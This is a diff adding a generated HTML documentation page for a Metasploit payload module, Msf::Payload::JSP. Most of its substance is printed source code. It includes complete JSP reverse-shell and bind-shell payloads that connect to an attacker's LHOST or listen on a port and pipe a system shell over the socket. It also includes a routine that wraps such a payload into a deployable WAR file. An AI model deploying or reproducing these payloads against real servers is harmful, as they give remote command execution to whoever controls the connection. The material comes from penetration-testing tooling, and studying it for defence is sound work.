@@ -1,0 +1,633 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>
+  Module: Msf::Payload::JSP
+  
+    &mdash; Documentation by YARD 0.8.7.4
+  
+</title>
+
+  <link rel="stylesheet" href="../../css/style.css" type="text/css" charset="utf-8" />
+
+  <link rel="stylesheet" href="../../css/common.css" type="text/css" charset="utf-8" />
+
+<script type="text/javascript" charset="utf-8">
+  hasFrames = window.top.frames.main ? true : false;
+  relpath = '../../';
+  framesUrl = "../../frames.html#!Msf/Payload/JSP.html";
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div id="header">
+      <div id="menu">
+  
+    <a href="../../_index.html">Index (J)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Payload.html" title="Msf::Payload (class)">Payload</a></span></span>
+     &raquo; 
+    <span class="title">JSP</span>
+  
+
+  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
+</div>
+
+      <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../class_list.html">
+      Class List
+    </a>
+  
+    <a class="full_list_link" id="method_list_link"
+        href="../../method_list.html">
+      Method List
+    </a>
+  
+    <a class="full_list_link" id="file_list_link"
+        href="../../file_list.html">
+      File List
+    </a>
+  
+</div>
+      <div class="clear"></div>
+    </div>
+
+    <iframe id="search_frame"></iframe>
+
+    <div id="content"><h1>Module: Msf::Payload::JSP
+  
+  
+  
+</h1>
+
+<dl class="box">
+  
+  
+    
+  
+    
+  
+  
+  
+    <dt class="r1 last">Defined in:</dt>
+    <dd class="r1 last">lib/msf/core/payload/jsp.rb</dd>
+  
+</dl>
+<div class="clear"></div>
+
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_war-instance_method" title="#generate_war (instance method)">- (Rex::Zip::Jar) <strong>generate_war</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Wraps the jsp payload into a war.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#jsp_bind_tcp-instance_method" title="#jsp_bind_tcp (instance method)">- (String) <strong>jsp_bind_tcp</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Outputs jsp that spawns a bind TCP shell.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#jsp_reverse_tcp-instance_method" title="#jsp_reverse_tcp (instance method)">- (String) <strong>jsp_reverse_tcp</strong> </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Outputs jsp code that spawns a reverse TCP shell.</p>
+</div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="generate_war-instance_method">
+  
+    - (<tt><span class='object_link'><a href="../../Rex/Zip/Jar.html" title="Rex::Zip::Jar (class)">Rex::Zip::Jar</a></span></tt>) <strong>generate_war</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Wraps the jsp payload into a war</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt><span class='object_link'><a href="../../Rex/Zip/Jar.html" title="Rex::Zip::Jar (class)">Rex::Zip::Jar</a></span></tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>a war to execute the jsp payload</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 131</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_war'>generate_war</span>
+  <span class='id identifier rubyid_jsp_name'>jsp_name</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha_lower'>rand_text_alpha_lower</span><span class='lparen'>(</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>8</span><span class='rparen'>)</span><span class='op'>+</span><span class='int'>8</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>.jsp</span><span class='tstring_end'>&quot;</span></span>
+
+  <span class='id identifier rubyid_zip'>zip</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Zip</span><span class='op'>::</span><span class='const'>Jar</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
+
+  <span class='id identifier rubyid_web_xml'>web_xml</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOF</span>
+<span class='tstring_content'>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE web-app PUBLIC
+&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;
+&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;
+&lt;web-app&gt;
+&lt;welcome-file-list&gt;
+  &lt;welcome-file&gt;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_jsp_name'>jsp_name</span><span class='embexpr_end'>}</span><span class='tstring_content'>&lt;/welcome-file&gt;
+&lt;/welcome-file-list&gt;
+&lt;/web-app&gt;
+</span><span class='heredoc_end'>  EOF
+</span>
+  <span class='id identifier rubyid_zip'>zip</span><span class='period'>.</span><span class='id identifier rubyid_add_file'>add_file</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>WEB-INF/</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_zip'>zip</span><span class='period'>.</span><span class='id identifier rubyid_add_file'>add_file</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>WEB-INF/web.xml</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_web_xml'>web_xml</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_zip'>zip</span><span class='period'>.</span><span class='id identifier rubyid_add_file'>add_file</span><span class='lparen'>(</span><span class='id identifier rubyid_jsp_name'>jsp_name</span><span class='comma'>,</span> <span class='id identifier rubyid_generate'>generate</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_zip'>zip</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="jsp_bind_tcp-instance_method">
+  
+    - (<tt>String</tt>) <strong>jsp_bind_tcp</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Outputs jsp that spawns a bind TCP shell</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>jsp code that executes bind TCP payload</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 8</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_jsp_bind_tcp'>jsp_bind_tcp</span>
+  <span class='comment'># Modified from: http://www.security.org.sg/code/jspreverse.html
+</span>  <span class='id identifier rubyid_jsp'>jsp</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>&lt;%@page import=&quot;java.lang.*&quot;%&gt;
+&lt;%@page import=&quot;java.util.*&quot;%&gt;
+&lt;%@page import=&quot;java.io.*&quot;%&gt;
+&lt;%@page import=&quot;java.net.*&quot;%&gt;
+
+&lt;%
+class StreamConnector extends Thread
+{
+  InputStream is;
+  OutputStream os;
+
+  StreamConnector( InputStream is, OutputStream os )
+  {
+    this.is = is;
+    this.os = os;
+  }
+
+  public void run()
+  {
+    BufferedReader in  = null;
+    BufferedWriter out = null;
+    try
+    {
+      in  = new BufferedReader( new InputStreamReader( this.is ) );
+      out = new BufferedWriter( new OutputStreamWriter( this.os ) );
+      char buffer[] = new char[8192];
+      int length;
+      while( ( length = in.read( buffer, 0, buffer.length ) ) &gt; 0 )
+      {
+        out.write( buffer, 0, length );
+        out.flush();
+      }
+    } catch( Exception e ){}
+    try
+    {
+      if( in != null )
+        in.close();
+      if( out != null )
+        out.close();
+    } catch( Exception e ){}
+  }
+}
+
+try
+{
+  ServerSocket server_socket = new ServerSocket( </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='embexpr_end'>}</span><span class='tstring_content'> );
+  Socket client_socket = server_socket.accept();
+  server_socket.close();
+  Process process = Runtime.getRuntime().exec( &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHELL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot; );
+  ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
+  ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
+} catch( Exception e ) {}
+%&gt;
+</span><span class='heredoc_end'>  EOS
+</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_jsp'>jsp</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="jsp_reverse_tcp-instance_method">
+  
+    - (<tt>String</tt>) <strong>jsp_reverse_tcp</strong> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Outputs jsp code that spawns a reverse TCP shell</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>jsp code that executes reverse TCP payload</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/jsp.rb', line 71</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_jsp_reverse_tcp'>jsp_reverse_tcp</span>
+  <span class='comment'># JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html
+</span>  <span class='id identifier rubyid_jsp'>jsp</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
+<span class='tstring_content'>&lt;%@page import=&quot;java.lang.*&quot;%&gt;
+&lt;%@page import=&quot;java.util.*&quot;%&gt;
+&lt;%@page import=&quot;java.io.*&quot;%&gt;
+&lt;%@page import=&quot;java.net.*&quot;%&gt;
+
+&lt;%
+class StreamConnector extends Thread
+{
+  InputStream is;
+  OutputStream os;
+
+  StreamConnector( InputStream is, OutputStream os )
+  {
+    this.is = is;
+    this.os = os;
+  }
+
+  public void run()
+  {
+    BufferedReader in  = null;
+    BufferedWriter out = null;
+    try
+    {
+      in  = new BufferedReader( new InputStreamReader( this.is ) );
+      out = new BufferedWriter( new OutputStreamWriter( this.os ) );
+      char buffer[] = new char[8192];
+      int length;
+      while( ( length = in.read( buffer, 0, buffer.length ) ) &gt; 0 )
+      {
+        out.write( buffer, 0, length );
+        out.flush();
+      }
+    } catch( Exception e ){}
+    try
+    {
+      if( in != null )
+        in.close();
+      if( out != null )
+        out.close();
+    } catch( Exception e ){}
+  }
+}
+
+try
+{
+  Socket socket = new Socket( &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LHOST</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LPORT</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='embexpr_end'>}</span><span class='tstring_content'> );
+  Process process = Runtime.getRuntime().exec( &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHELL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot; );
+  ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+  ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+} catch( Exception e ) {}
+%&gt;
+</span><span class='heredoc_end'>  EOS
+</span>  <span class='kw'>return</span> <span class='id identifier rubyid_jsp'>jsp</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+    <div id="footer">
+  Generated on Wed Sep  3 01:51:04 2014 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.8.7.4 (ruby-2.1.2).
+</div>
+
+  </body>
+</html>
